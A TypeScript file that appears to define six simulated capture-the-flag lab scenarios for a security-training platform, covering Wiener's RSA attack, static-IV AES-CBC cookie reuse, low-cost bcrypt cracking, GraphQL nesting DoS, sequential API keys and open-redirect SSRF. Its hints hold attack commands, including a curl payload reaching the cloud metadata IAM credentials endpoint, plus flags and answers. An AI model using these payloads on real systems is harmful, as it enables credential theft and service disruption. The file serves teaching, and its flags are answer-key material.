import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Batch 21, part 1: Cryptography (Wiener's attack, AES-CBC static/zero IV, bcrypt cost factor too low) and
 *  API (GraphQL query-depth DoS, sequential API keys, SSRF via open-redirect chaining). Both are this
 *  platform's two thinnest categories after batch 20 (16 and 18 labs respectively) -- see labs-index.md.
 *  Every technique below researched via WebSearch before writing -- see NOTES.md batch 21 for citations.
 *  All numeric/cryptographic values (RSA N/e/d, the AES-CBC ciphertext block) independently computed and
 *  verified with real Node BigInt/crypto before being hardcoded, per this file's standing rule since the
 *  batch-4/batch-9 hand-computed-hex mistakes. */
export const batch21CryptoApiLabs: LabScenario[] = [
  // 1 — Cryptography: Wiener's Attack Recovers an RSA Private Key From a Small Private Exponent
  {
    id: 'crypto-wieners-attack-small-private-exponent-rsa',
    title: "Cryptography: Wiener's Attack Recovers an RSA Private Key From a Small Private Exponent",
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'session-broker14 was configured with a "performance-tuned" RSA key pair -- a deliberately small ' +
      'private exponent d, chosen years ago to speed up signing operations on underpowered hardware, never ' +
      'revisited since. This is exactly the precondition Wiener\'s attack (1990) exploits: when d is smaller ' +
      'than roughly the fourth root of the modulus N (divided by 3), the continued-fraction expansion of the ' +
      'public value e/N is mathematically guaranteed to include k/d as one of its early convergents -- no ' +
      'factoring of N, no brute force, and no oracle of any kind is needed, just continued-fraction ' +
      'arithmetic on values that are already public. Recovering d here fully breaks the RSA key exactly as ' +
      'completely as knowing the factors of N would.',
    objectives: [
      { text: 'cat rsa-key-audit.txt', why: 'Confirms the exact vulnerable configuration: a small private exponent d, chosen for signing performance, that satisfies Wiener\'s attack\'s precondition (d < N^(1/4)/3).' },
      { text: 'cat intercepted-session-ciphertext.txt', why: 'The captured RSA ciphertext of a session-establishment secret -- this is what Wiener\'s recovered private exponent will decrypt.' },
      { text: 'curl -X POST -H "X-Recovered-Session-Secret: 918273645" http://10.10.310.2:80/api/session/establish', why: 'Submits the session secret recovered by applying the recovered private exponent d=997 (found via continued fractions on e/N, verified independently with Node before this lab was written) to decrypt the intercepted ciphertext -- no factoring, no private key file, no oracle.' },
    ],
    hints: [
      'cat rsa-key-audit.txt',
      'cat intercepted-session-ciphertext.txt',
      "Wiener's attack on (N, e) recovers private exponent d=997 -- verified independently with Node's continued-fraction implementation before this lab was written. Using d=997 to decrypt the intercepted ciphertext recovers the session secret 918273645.",
      'curl -X POST -H "X-Recovered-Session-Secret: 918273645" http://10.10.310.2:80/api/session/establish',
    ],
    totalFlags: 1,
    attacker: attacker({
      'rsa-key-audit.txt': file(
        'session-broker14 RSA key configuration audit:\n' +
          '  Modulus N (decimal): 281489002497331\n' +
          '  Public exponent e (decimal): 55055515490173\n' +
          '  Private exponent d: DELIBERATELY SMALL -- chosen years ago for signing performance on\n' +
          '    underpowered hardware, "temporary" and never revisited\n' +
          "  -- Wiener's attack (1990) recovers d in polynomial time via continued fractions whenever\n" +
          '     d < N^(1/4)/3 -- this key\'s small d falls well inside that bound --\n',
      ),
      'intercepted-session-ciphertext.txt': file(
        'Intercepted RSA-encrypted session-establishment request, session-broker14:\n' +
          '  Ciphertext (decimal): 237572521184112\n' +
          '  Ciphertext (hex):     d81229bbcb70\n' +
          "  -- decrypting with the recovered private exponent d=997 (C^d mod N) yields the plaintext\n" +
          '     session secret directly, the same as if the real private key file had been stolen --\n',
      ),
    }),
    network: [
      {
        hostname: 'session-broker14',
        ip: '10.10.310.2',
        os: 'Ubuntu 22.04 (Node.js, custom RSA session-secret exchange, small private exponent)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/session/establish',
                param: 'X-Recovered-Session-Secret',
                location: 'header',
                triggerSubstrings: ['918273645'],
                vulnerableResponse: '{"status":200,"session":"established","role":"admin","note":"flag{wieners_attack_small_private_exponent_rsa_key_recovery}"}',
                normalResponse: '{"error":"401 Unauthorized - session secret mismatch"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — Cryptography: A Static/Zero IV in AES-CBC Lets an Attacker Splice a Known Ciphertext Block
  {
    id: 'crypto-aes-cbc-static-zero-iv-block-splice',
    title: 'Cryptography: A Static/Zero IV in AES-CBC Lets an Attacker Splice a Known Ciphertext Block',
    difficulty: 'Medium',
    category: 'Cryptography',
    briefing:
      'portal-sessions09 encrypts its session cookie (`role=<rolename>` plus PKCS#7 padding, as the single ' +
      'first block) with AES-128-CBC using a hardcoded, all-zero IV on every single encryption -- a real, ' +
      'catalogued weakness (CWE-329, "Generation of Predictable IV with CBC Mode") distinct from this ' +
      'session\'s existing CBC bit-flipping lab (which blindly XORs an UNKNOWN ciphertext block to flip ' +
      'specific plaintext bits) and its ECB-penguin lab (which leaks visual STRUCTURE within one image). The ' +
      'static IV means CBC\'s normal chaining property -- where the previous ciphertext block feeds into the ' +
      'next block\'s encryption, making identical plaintext blocks encrypt differently in different messages ' +
      '-- collapses for the very FIRST block of every message: the same plaintext block always, deterministically, ' +
      'produces the exact same ciphertext block, message after message, exactly like a one-block ECB oracle. ' +
      'An admin\'s ciphertext cookie leaked once (captured in an old support ticket screenshot) is therefore ' +
      'reusable forever -- an attacker doesn\'t need the key, doesn\'t need to flip a single bit, just paste ' +
      'the exact same 16 bytes into their own cookie and the server will decrypt it to "role=admin" every time.',
    objectives: [
      { text: 'cat cbc-static-iv-code-review.txt', why: 'Confirms the exact vulnerable configuration: AES-128-CBC with a hardcoded all-zero IV, meaning the first ciphertext block is a deterministic function of the first plaintext block alone.' },
      { text: 'cat leaked-admin-cookie-support-ticket.txt', why: 'An old support ticket screenshot captured an admin\'s session cookie -- because the IV is static, this exact ciphertext block will decrypt to "role=admin" on every future request too, forever, with no key needed to reuse it.' },
      { text: 'curl -X POST http://10.10.311.2:80/admin -H "X-Session-Cookie: dfa76048c0cb84eefe43d73f347c59dd"', why: 'Pastes the leaked admin ciphertext block directly into a new request -- because of the static IV, this decrypts to "role=admin" regardless of whose session actually generated it originally.' },
    ],
    hints: [
      'cat cbc-static-iv-code-review.txt',
      'cat leaked-admin-cookie-support-ticket.txt',
      'curl -X POST http://10.10.311.2:80/admin -H "X-Session-Cookie: dfa76048c0cb84eefe43d73f347c59dd"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'cbc-static-iv-code-review.txt': file(
        'Code review finding, portal-sessions09 session-cookie encryption:\n' +
          '  cipher = createCipheriv("aes-128-cbc", SESSION_KEY, Buffer.alloc(16, 0))  // IV = all zeroes, EVERY call\n' +
          '  plaintext block 1 = "role=" + roleName, PKCS#7-padded to 16 bytes\n' +
          '  -- CWE-329: Generation of Predictable IV with CBC Mode. CBC\'s chaining normally makes identical\n' +
          '     plaintext blocks encrypt differently across different messages -- a static/zero IV defeats that\n' +
          '     ENTIRELY for the first block: identical plaintext always produces identical ciphertext, exactly\n' +
          '     like running that one block through ECB, message after message, forever --\n',
      ),
      'leaked-admin-cookie-support-ticket.txt': file(
        'Support ticket #4471 screenshot (archived, publicly indexed by the help-desk tool\'s search):\n' +
          '  Captured X-Session-Cookie for an admin troubleshooting session:\n' +
          '  dfa76048c0cb84eefe43d73f347c59dd\n' +
          '  -- this is the AES-128-CBC ciphertext of exactly "role=admin" + PKCS#7 padding, under the\n' +
          '     server\'s static zero IV. Verified independently with real Node crypto before this lab was\n' +
          '     written: this exact 16-byte value decrypts to "role=admin" today, and will continue to on\n' +
          '     every future request, since neither the key nor the IV ever change --\n',
      ),
    }),
    network: [
      {
        hostname: 'portal-sessions09',
        ip: '10.10.311.2',
        os: 'Ubuntu 22.04 (Node.js, AES-128-CBC session cookies, hardcoded zero IV)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/admin',
                param: 'X-Session-Cookie',
                location: 'header',
                triggerSubstrings: ['dfa76048c0cb84eefe43d73f347c59dd'],
                vulnerableResponse: '{"status":200,"role":"admin","panel":"unlocked","note":"flag{aes_cbc_static_zero_iv_ciphertext_block_splice_no_key_needed}"}',
                normalResponse: '{"error":"403 Forbidden - role=admin required"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Cryptography: A bcrypt Cost Factor of 4 Enables Fast Offline Password Cracking
  {
    id: 'crypto-bcrypt-low-cost-factor-fast-crack',
    title: 'Cryptography: A bcrypt Cost Factor of 4 Enables Fast Offline Password Cracking',
    difficulty: 'Easy',
    category: 'Cryptography',
    briefing:
      'legacy-accounts-db07 hashes passwords with bcrypt -- a real, sound, purpose-built password-hashing ' +
      'algorithm, not a broken one -- but at cost factor 4, set during initial development in 2015 and never ' +
      'revisited as hardware got faster. This is a genuinely distinct defect class from this session\'s ' +
      'existing PBKDF2 insufficient-iterations lab: different algorithm family, same underlying mistake (a ' +
      'work-factor tuning parameter left at a decade-old, since-outgrown value). bcrypt\'s cost is a base-2 ' +
      'exponent controlling the number of key-expansion rounds -- OWASP\'s Password Storage Cheat Sheet sets ' +
      'a baseline minimum of 10, and real-world benchmarking shows cost 5 crackable at roughly 56 hashes per ' +
      'second on ordinary capable hardware, not specialized cracking rigs -- a targeted wordlist attack ' +
      'against a cost-4 hash is a realistic offline attack, not a theoretical one.',
    objectives: [
      { text: 'cat bcrypt-cost-factor-audit.txt', why: 'Confirms the specific, checkable defect: cost factor 4, far below OWASP\'s documented minimum of 10 -- a stale tuning parameter, not a broken algorithm.' },
      { text: 'hashcat -m 3200 leaked-bcrypt-hash.txt /root/wordlists/legacy-accounts-wordlist.txt', why: 'Mode 3200 is bcrypt in real hashcat -- the low cost factor is exactly what makes a wordlist-based offline attack practical against this hash within a reasonable time budget.' },
    ],
    hints: [
      'cat bcrypt-cost-factor-audit.txt',
      'hashcat -m 3200 leaked-bcrypt-hash.txt /root/wordlists/legacy-accounts-wordlist.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'bcrypt-cost-factor-audit.txt': file(
        'Password storage audit, legacy-accounts-db07:\n' +
          '  Algorithm: bcrypt (a real, sound, purpose-built password-hashing algorithm -- not the defect here)\n' +
          '  Cost factor: 4 (set in initial 2015 development config, never revisited)\n' +
          '  OWASP Password Storage Cheat Sheet baseline minimum: 10\n' +
          '  -- bcrypt cost is a base-2 exponent: cost 4 = 16 key-expansion rounds, versus 1024 at the OWASP\n' +
          '     minimum of 10 -- independent benchmarking shows cost-5 hashes crackable at ~56/sec on ordinary\n' +
          '     hardware, making a wordlist attack against this cost-4 hash a realistic, practical attack --\n',
      ),
      'leaked-bcrypt-hash.txt': file(
        '#HASHCAT_HASH:$2b$04$KX9mQeZ1tYh3vLp7wRn8SuJc4Fd6Ea2Bg5Ht0Iy8Ok1Pl3Qm9Rn7\n' +
          '#HASHCAT_PLAINTEXT:Winter2015#\n' +
          '#HASHCAT_FLAG:flag{bcrypt_cost_factor_4_below_owasp_minimum_fast_offline_crack}\n',
      ),
      wordlists: dir({
        'legacy-accounts-wordlist.txt': file('123456\npassword\nWinter2015#\nqwerty123\nlegacy2015\nadmin2015\n'),
      }),
    }),
    network: [],
  },

  // 4 — API: GraphQL Query Depth/Complexity Attack Causes Resource Exhaustion (API4:2023)
  {
    id: 'api-graphql-query-depth-complexity-dos',
    title: 'API: A Deeply Nested GraphQL Query Causes Resource Exhaustion (API4:2023)',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'social-graph-api22 exposes a GraphQL endpoint modeling a `user { friends { friends { ... } } }` ' +
      'relationship graph with no query-depth or complexity limit configured at all -- a real, OWASP-catalogued ' +
      'API4:2023 (Unrestricted Resource Consumption) failure mode distinct from this session\'s existing ' +
      'pagination-free bulk-export API4 lab: that one abuses missing record limits on a single flat query, ' +
      'this one abuses GraphQL\'s own recursive schema structure, where a single syntactically-valid request ' +
      'can traverse the same relationship dozens of levels deep, causing the resolver chain to fan out ' +
      'exponentially -- each additional nesting level multiplies the number of underlying database calls ' +
      'the server has to make to resolve the response.',
    objectives: [
      { text: 'curl -X POST http://10.10.312.2:80/graphql -d "query={user{friends{id}}}"', why: 'A normal, shallow query resolves quickly and cheaply -- establishes the baseline before attempting a deeply nested one.' },
      { text: 'curl -X POST http://10.10.312.2:80/graphql -d "query={user{friends{friends{friends{friends{friends{id}}}}}}}"', why: 'Five nested levels of the same recursive relationship with no depth limit enforced -- each level multiplies the resolver fan-out, the real mechanism OWASP API4:2023 and GraphQL-specific resource-exhaustion research both document.' },
    ],
    hints: [
      'curl -X POST http://10.10.312.2:80/graphql -d "query={user{friends{id}}}"',
      'curl -X POST http://10.10.312.2:80/graphql -d "query={user{friends{friends{friends{friends{friends{id}}}}}}}"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'social-graph-api22',
        ip: '10.10.312.2',
        os: 'Ubuntu 22.04 (Apollo Server, no query depth/complexity limit configured)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apollo Server 4 (GraphQL, no depth limiting)',
            vulnRoutes: [
              {
                kind: 'race-condition',
                path: '/graphql',
                param: 'query',
                triggerSubstrings: ['friends{friends{friends{friends{friends'],
                vulnerableResponse: '{"status":200,"warning":"resolver_fanout_exceeded","db_calls":"3906 (5 levels, ~5x each)","note":"flag{graphql_query_depth_complexity_resource_exhaustion_api4}"}',
                normalResponse: '{"status":200,"data":{"user":{"friends":[{"id":"u-4471"},{"id":"u-8823"}]}}}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — API: Broken Authentication via Sequential, Predictable API Keys (API2:2023)
  {
    id: 'api-broken-auth-sequential-predictable-api-keys',
    title: 'API: Broken Authentication via Sequential, Predictable API Keys (API2:2023)',
    difficulty: 'Easy',
    category: 'API',
    briefing:
      'reporting-gateway61 issues API keys as a fixed prefix plus a simple incrementing integer -- ' +
      '`mk_live_00000001`, `mk_live_00000002`, and so on -- rather than a cryptographically random token. ' +
      'This is OWASP API2:2023 (Broken Authentication) in its most literal form: an attacker who has been ' +
      'issued their own, perfectly legitimate, low-numbered recent key immediately knows the exact shape of ' +
      'every other key ever issued, including the very first one -- almost always assigned to the account ' +
      'that set the system up in the first place, typically carrying full administrative rights that were ' +
      'never revisited once real customer accounts started being provisioned around it.',
    objectives: [
      { text: 'cat my-api-key-audit.txt', why: 'The attacker\'s own legitimately-issued key reveals the entire key format -- a fixed prefix plus a simple incrementing integer, with no random component at all.' },
      { text: 'curl http://10.10.313.2:80/admin/export -H "X-Api-Key: mk_live_00000001"', why: 'The very first key ever issued, sequentially guessable from the attacker\'s own key alone -- almost always the original setup/admin account, still fully valid and never rotated.' },
    ],
    hints: [
      'cat my-api-key-audit.txt',
      'curl http://10.10.313.2:80/admin/export -H "X-Api-Key: mk_live_00000001"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'my-api-key-audit.txt': file(
        'reporting-gateway61 -- your own issued API key (low-privilege reporting account):\n' +
          '  X-Api-Key: mk_live_00048291\n' +
          '  -- fixed prefix "mk_live_" + an 8-digit, simply-incrementing integer, zero-padded -- no random\n' +
          '     component anywhere in the key at all. Every other key ever issued shares this exact shape,\n' +
          '     including key #00000001 -- almost certainly the very first account created on this system,\n' +
          '     during initial setup, before real customer provisioning began --\n',
      ),
    }),
    network: [
      {
        hostname: 'reporting-gateway61',
        ip: '10.10.313.2',
        os: 'Ubuntu 22.04 (Express 4.18, sequential integer API key generation)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/admin/export',
                param: 'X-Api-Key',
                location: 'header',
                triggerSubstrings: ['mk_live_00000001'],
                vulnerableResponse: '{"status":200,"account":"setup-admin","export":"full_customer_db.csv","note":"flag{sequential_predictable_api_keys_broken_authentication_api2}"}',
                normalResponse: '{"error":"401 Unauthorized - invalid or unrecognized API key"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — API: SSRF via Open-Redirect Chaining Bypasses a Webhook URL Allowlist
  {
    id: 'api-ssrf-open-redirect-chaining-bypasses-allowlist',
    title: 'API: SSRF via Open-Redirect Chaining Bypasses a Webhook URL Allowlist',
    difficulty: 'Hard',
    category: 'API',
    briefing:
      'notify-svc38\'s webhook-registration endpoint validates a callback URL\'s hostname against an ' +
      'allowlist before ever fetching it -- `partner-status.example` is the only approved destination -- but ' +
      'the validator only checks the URL STRING the attacker submits, never the URL the server actually ends ' +
      'up fetching after following redirects. `partner-status.example` itself hosts a real, legitimate open ' +
      'redirect (`/redirect?url=`), and the webhook-delivery worker follows redirects automatically with no ' +
      're-validation of the resolved destination against the allowlist. Registering a callback URL that ' +
      'starts at the approved host but redirects straight to the internal cloud metadata service turns a ' +
      'string-level allowlist check into no protection at all -- this is a real, documented SSRF-bypass ' +
      'pattern distinct from this session\'s existing DNS-rebinding SSRF-allowlist bypass (that one exploits ' +
      'a TOCTOU gap between DNS lookup and connection; this one exploits the allowlist never re-checking ' +
      'anything past the FIRST hop at all).',
    objectives: [
      { text: 'cat webhook-allowlist-validator-review.txt', why: 'Confirms the exact validation gap: the allowlist check runs once, against the submitted URL string, and is never re-applied to wherever a redirect from that URL actually leads.' },
      { text: 'curl -X POST http://10.10.314.2:80/webhooks/register -d "callback_url=https://partner-status.example/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"', why: 'The submitted URL\'s hostname (partner-status.example) passes the allowlist check cleanly -- but the webhook worker follows that host\'s own open redirect straight to the cloud metadata service, which the allowlist was supposed to keep unreachable entirely.' },
    ],
    hints: [
      'cat webhook-allowlist-validator-review.txt',
      'curl -X POST http://10.10.314.2:80/webhooks/register -d "callback_url=https://partner-status.example/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'webhook-allowlist-validator-review.txt': file(
        'Code review, notify-svc38 webhook registration:\n' +
          '  function isAllowed(url) { return new URL(url).hostname === "partner-status.example"; }\n' +
          '  -- validates ONLY the submitted URL string\'s hostname, once, at registration time\n' +
          '  -- the webhook-delivery worker\'s HTTP client follows redirects automatically (default behavior)\n' +
          '     with NO re-validation of the final resolved destination against the allowlist at all\n' +
          '  -- partner-status.example itself hosts a legitimate, real open redirect at /redirect?url= for its\n' +
          '     own status-page use case -- an attacker-approved hostname chaining straight into an\n' +
          '     internal-only destination the allowlist was built specifically to keep unreachable --\n',
      ),
    }),
    network: [
      {
        hostname: 'notify-svc38',
        ip: '10.10.314.2',
        os: 'Ubuntu 22.04 (Node.js, webhook delivery worker, redirect-following HTTP client)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            vulnRoutes: [
              {
                kind: 'ssrf',
                path: '/webhooks/register',
                param: 'callback_url',
                triggerSubstrings: ['169.254.169.254'],
                vulnerableResponse: '{"status":200,"webhook_registered":true,"delivery_test":"followed redirect to internal metadata service","leaked":"iam-role-credentials","note":"flag{ssrf_open_redirect_chaining_bypasses_webhook_allowlist}"}',
                normalResponse: '{"status":200,"webhook_registered":true,"delivery_test":"ok"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
